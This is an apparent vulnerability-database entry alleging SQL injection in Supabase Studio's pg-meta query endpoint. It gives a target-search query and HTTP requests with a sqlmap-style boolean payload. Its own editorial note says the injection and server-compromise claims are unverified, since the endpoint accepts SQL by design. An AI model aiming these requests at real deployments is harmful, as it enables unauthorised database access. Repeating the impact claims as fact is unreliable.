---
source: "wy876 漏洞文库"
title: "Supabase query存在SQL注入漏洞"
product: "Supabase Studio"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "quarantined"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
fofa_unverified: "app.name="
source_status: "unknown"
prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-0eff0e8f87f4bdcdb9fb7d1a"
entity_id: "ve-0eff0e8f87f4bdcdb9fb7d1a"
schema_version: "1"
---

# Supabase query存在SQL注入漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

SQL 管理接口接受 query 是其预期功能。本页没有证明匿名访问、越权或其他权限边界被突破，也未提供响应；不能仅因接受 SELECT 就认定 SQL 注入或服务器执行能力。


### 本次正文校订

- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- SQL管理端点本来接受query，必须证明未授权或权限边界绕过而非见SQL就称注入
- 缺版本/部署/认证状态与响应
- Hunter查询误放fofa且截断
- 服务器执行影响超出所给SELECT证据

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
Supabase是一个开源的Firebase替代品，提供了一系列的后端功能，让你可以更快地构建产品。它使用PostgreSQL作为数据库，支持SQL和RESTful API访问。此外，Supabase提供了完整的认证系统，支持邮箱、手机号、第三方服务等多种登录方式。Supabase 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息甚至可获得服务器权限。

# 二、影响版本
+ Supabase

# 三、资产测绘
+ hunter`app.name="Supabase"`
+ 特征


# 四、漏洞复现
```http
POST /api/pg-meta/default/query HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 103

{"query":"(SELECT CONCAT(CONCAT('qjpzq',(CASE WHEN (2016=2016) THEN '1' ELSE '0' END)),'qkbbq'))"}
```


sqlmap

```http
POST /api/pg-meta/default/query HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 103

{"query":""}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsa0ghyt670h5o3q>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
